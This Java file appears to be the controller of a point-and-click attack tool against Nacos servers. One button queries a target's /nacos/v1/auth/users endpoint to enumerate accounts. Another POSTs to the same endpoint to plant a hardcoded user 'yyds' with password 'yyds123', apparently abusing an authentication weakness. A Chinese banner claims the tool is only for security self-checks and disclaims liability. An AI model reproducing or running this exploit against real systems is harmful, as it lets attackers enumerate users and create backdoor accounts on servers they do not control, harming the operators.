package kz.nacos;

import javafx.fxml.FXML;
import javafx.scene.control.Label;

import javafx.fxml.FXML;
import javafx.scene.control.Button;
import javafx.scene.control.ChoiceBox;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import javafx.event.ActionEvent;

import javax.swing.*;
import java.util.HashMap;


public class NacosController {

    @FXML
    private ChoiceBox<String> choice_cve;

    @FXML
    private TextField url;

    @FXML
    private TextArea base_info;

    @FXML
    private TextArea base_info2;
    @FXML
    private Button execute;

    @FXML
    private ChoiceBox<String> choice_cmd;

    @FXML
    void check(ActionEvent event) throws Exception{

        String url = this.url.getText();
        String result = HttpTool.getHttpReuest(url+"nacos/v1/auth/users?pageNo=1&pageSize=10","utf-8");
        this.base_info.setText(result);
    }

    @FXML
    private void get_execute_cmd(ActionEvent event)throws Exception {
        String url = this.url.getText();
        String command = this.choice_cmd.getValue();
        if (command == "Add User yyds yyds123")
            command = "username=yyds&password=yyds123";
        String result = HttpTool.postHttpReuest(url+"nacos/v1/auth/users","username=yyds&password=yyds123","utf-8");
        System.out.println(result);
        this.base_info2.setText(result);
    }
    public static String BASICINFO = "" +
            "\t\t\t---------------------------------------------\r\n\t\t\t" +
            "本工具仅提供给安服仔进行安全自查使用\r\n\t\t\t" +
            "用户滥用造成的一切后果与作者无关\r\n\t\t\t" +
            "使用者请务必遵守当地法律\r\n\t\t\t" +
            "本程序不得用于商业用途，仅限学习交流\r\n\t\t\t" +
            "---------------------------------------------\r\n\r\n";

    public static String[] Nacos={
            "nacos"
    };
    public static String[] mingling = {
            "Add User yyds yyds123",
    };

    public void deaultInformation(){
        this.choice_cve.setValue(Nacos[0]);
        for (String cve : Nacos){
            this.choice_cve.getItems().add(cve);
        }
        this.choice_cmd.setValue(mingling[0]);
        for(String ml : mingling){
            this.choice_cmd.getItems().add(ml);
            this.base_info.setText(BASICINFO);
        }
    }
    public void initialize(){
        try{
            this.deaultInformation();
        } catch (Exception e){
            e.printStackTrace();
        }
    }

}
